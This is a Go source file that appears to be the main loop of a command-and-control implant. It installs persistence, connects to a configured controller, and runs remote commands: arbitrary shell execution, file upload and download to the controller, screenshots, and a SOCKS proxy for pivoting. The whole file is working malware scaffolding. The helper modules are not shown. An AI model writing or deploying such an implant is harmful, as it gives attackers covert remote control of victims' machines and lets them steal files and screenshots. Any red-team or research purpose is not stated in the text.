package main

import (
	"log"
	"cmder"
	"cmder/tachyon/controller"
	"cmder/tachyon/modules"
	pb "cmder/axon/cmds"

	"google.golang.org/protobuf/proto"
)

func main() {
	err := modules.EnsurePersistence()
	if err != nil {
		log.Fatalf("failed to persist: %v", err)
	}
	controller := controller.Controller{Addr: cmder.Conf.Agent.ControllerAddress}
	controller.Connect()
	for {
		cmdReq, err := controller.ReadCommandRequest()
		if err != nil {
			log.Printf("failed to read command: %v", err)
			continue
		}
		var resp proto.Message
		switch cmdReq.Type {
		case pb.ECHO_CMD_TYPE:
			resp = modules.RunEchoCommand(cmdReq.GetEchoCommandRequest())
		case pb.SHELL_CMD_TYPE:
			resp = modules.RunShellCommand(cmdReq.GetShellCommandRequest())
		case pb.UPLOAD_FILE_CMD_TYPE:
			resp = modules.DownloadFileFromController(cmdReq.GetUploadFileRequest())
		case pb.DOWNLOAD_FILE_CMD_TYPE:
			resp = modules.UploadFileToController(cmdReq.GetDownloadFileRequest())
		case pb.SCREENSHOT_CMD_TYPE:
			resp = modules.Screenshot(cmdReq.GetScreenshotRequest())
		case pb.START_SOCKS_CMD_TYPE:
			resp = modules.StartSocksServer(cmdReq.GetStartSocksServerRequest(), controller.Session)
		case pb.STOP_SOCKS_CMD_TYPE:
			resp = modules.StopSocksServer(cmdReq.GetStopSocksServerRequest(), controller.Session)
		}
		err = controller.WriteCommandResponse(resp)
		if err != nil {
			log.Printf("failed to write command response: %v", err)
		}
	}
}
